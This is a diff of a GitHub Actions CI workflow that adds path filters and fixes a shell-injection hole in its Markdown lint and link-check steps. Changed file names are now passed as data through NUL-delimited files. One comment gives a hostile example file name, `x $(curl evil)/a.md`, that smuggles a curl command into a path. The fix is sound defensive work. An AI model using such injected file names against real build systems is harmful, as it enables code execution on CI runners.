@@ -161,6 +161,13 @@ jobs:
                   # skips dashboard-js-tests, so the behavioural tests for the
                   # very file under review would never run.
                   isfile("website/assets/supabase-session.js"),
+                  # #3787: `website/consent.js` is copied into the dashboard's
+                  # dist by `scripts/copy-shared-assets.mjs` as part of
+                  # `npm run build`, and the shipped-artifact guard in
+                  # src/distBundle.test.js reads that copy. Same rule as the
+                  # bridge entry above: naming the input is what makes the
+                  # guard run on the file it scans.
+                  isfile("website/consent.js"),
                   # #3525: the dashboard's security-headers guard also pins the
                   # MARKETING project's CSP, and it SCANS both projects'
                   # `functions/` trees (cookie writers, `text/html` producers) —
@@ -440,6 +447,9 @@ jobs:
                   # changes the served bundle — it too used to surface only
                   # through the committed dist rebuild.
                   isfile("product/pricing.json"),
+                  # #3787: the same copied build input — a consent-only change
+                  # changes the bundle this lane serves.
+                  isfile("website/consent.js"),
                   isfile(".github/workflows/ci.yml"),
               ),
               # ai-review-gate-tests (#2982): the signed-review merge gate's
@@ -473,10 +483,17 @@ jobs:
   #   migration-append-only    — edits/renames/deletions of already-merged
   #                              migrations are rejected (a change to an applied
   #                              migration must be a NEW timestamp file).
-  #                              #1235: when SUPABASE_ACCESS_TOKEN is available
-  #                              (same-repo PRs), a PURE PREFIX RENAME of a
-  #                              provably-unapplied migration is exempt; fork
-  #                              PRs (no token) keep the strict block (fail-closed).
+  #                              #1235/#2240: when SUPABASE_ACCESS_TOKEN is
+  #                              available (same-repo PRs), the exemption covers
+  #                              only a git-detected forward prefix rename (R*)
+  #                              whose destination version sorts strictly AFTER
+  #                              the newest applied version, with BOTH endpoints
+  #                              provably unapplied — the remedy
+  #                              check-migration-drift prescribes for an
+  #                              out-of-order repo-ahead migration. An edit or a
+  #                              deletion (M/T/D) carries no destination version,
+  #                              so it is NEVER exempt. Fork PRs (no token) keep
+  #                              the strict block (fail-closed).
   # Both drive the shared .github/scripts/check-migration-append-only script so
   # tests exercise the shipped logic. fetch-depth: 0 is required for the base
   # SHA to be available to `git diff` (default checkout is depth 1).
@@ -610,22 +627,55 @@ jobs:
         # failing closed on an empty base once #2386's fail-closed check lands.)
         if: ${{ !inputs.main_health }}
         run: |
+          # #4449: the list goes to a FILE and is consumed as DATA. A filename
+          # is PR-author-controlled, so it must never reach a shell — a path
+          # like `x $(curl evil)/a.md` would execute. markdownlint reads a NUL
+          # list via `xargs -0`; lychee reads a file via `--files-from`. This is
+          # the same pattern the main-health path below already uses, and the
+          # pin in tests/test_merge_throughput.py is what keeps the safety a
+          # CONTROL rather than an accident of the checkout depth: while the PR
+          # checkout was shallow this PR path could not produce a list at all,
+          # so its interpolation was unreachable rather than safe (#2802/#4449).
+          #
           # `--no-renames` is deliberate here, though this is a lint-target list
           # rather than a changed-set SELECTION set (so the pin that enforces the
-          # flag workflow-wide still applies to it): a rename's deleted .md source
-          # path is tolerated because markdownlint-cli exits 0 on a nonexistent
-          # path, and plain .md deletions already produce exactly such paths.
+          # flag workflow-wide still applies to it). `--diff-filter ACMR` keeps
+          # the list to paths that exist on disk: under `--no-renames` a rename
+          # contributes its deleted source path, and a plain .md deletion names a
+          # path lychee hard-errors on.
           # See tests/test_ci_selection.py::test_every_changed_set_diff_disables_rename_detection.
-          FILES=$(git diff --no-renames --name-only "${{ github.event.pull_request.base.sha }}"...HEAD -- '*.md' || true)
-          echo "files=$FILES" >> "$GITHUB_OUTPUT"
+          # A shallow PR checkout does not carry
+          # `github.event.pull_request.base.sha` in its object store, so this
+          # diff can fail ("Invalid symmetric difference expression"). Tolerate
+          # that — the list is then empty and both consumers are skipped —
+          # rather than aborting the step: `docs` is a REQUIRED status check, so
+          # a hard failure here reds every PR. The tolerance is pre-existing
+          # behaviour (`|| true` on the captured form); it is preserved here and
+          # pinned by the test, because dropping it silently converts this step
+          # from dormant to red.
+          git diff --no-renames --diff-filter ACMR -z --name-only \
+            "${{ github.event.pull_request.base.sha }}"...HEAD -- '*.md' \
+            > "$RUNNER_TEMP/pr-md.raw.nul" || :
+          # `./`-prefix every entry so no path can be read as an OPTION by
+          # xargs (argument injection) and lychee's --files-from never treats
+          # it as a `#` comment.
+          sed -z 's|^|./|' "$RUNNER_TEMP/pr-md.raw.nul" > "$RUNNER_TEMP/pr-md.nul"
+          tr '\0' '\n' < "$RUNNER_TEMP/pr-md.nul" > "$RUNNER_TEMP/pr-md.txt"
+          count="$(grep -c . "$RUNNER_TEMP/pr-md.txt" || true)"
+          echo "count=${count:-0}" >> "$GITHUB_OUTPUT"
       - name: Markdownlint (changed files)
-        if: steps.changed.outputs.files != ''
-        run: npx markdownlint-cli ${{ steps.changed.outputs.files }}
+        if: ${{ !inputs.main_health && steps.changed.outputs.count != '0' }}
+        run: |
+          # NUL-delimited ARGV via xargs — a filename is data, never shell text (#4449).
+          xargs -0 -a "$RUNNER_TEMP/pr-md.nul" npx markdownlint-cli
       - name: Link check (changed files)
-        if: steps.changed.outputs.files != ''
+        if: ${{ !inputs.main_health && steps.changed.outputs.count != '0' }}
         uses: lycheeverse/lychee-action@v2
         with:
-          args: --no-progress ${{ steps.changed.outputs.files }}
+          # `--files-from` reads the list from a FILE — no filename reaches a
+          # shell command (#4449).
+          args: --no-progress --files-from ${{ runner.temp }}/pr-md.txt
+          failIfEmpty: false
       # ----- main-health path (#5215 Task 8 / D13) --------------------------
       # The PR path above cannot run on a schedule (there is no
       # `github.event.pull_request.base.sha`), so under `main_health` the
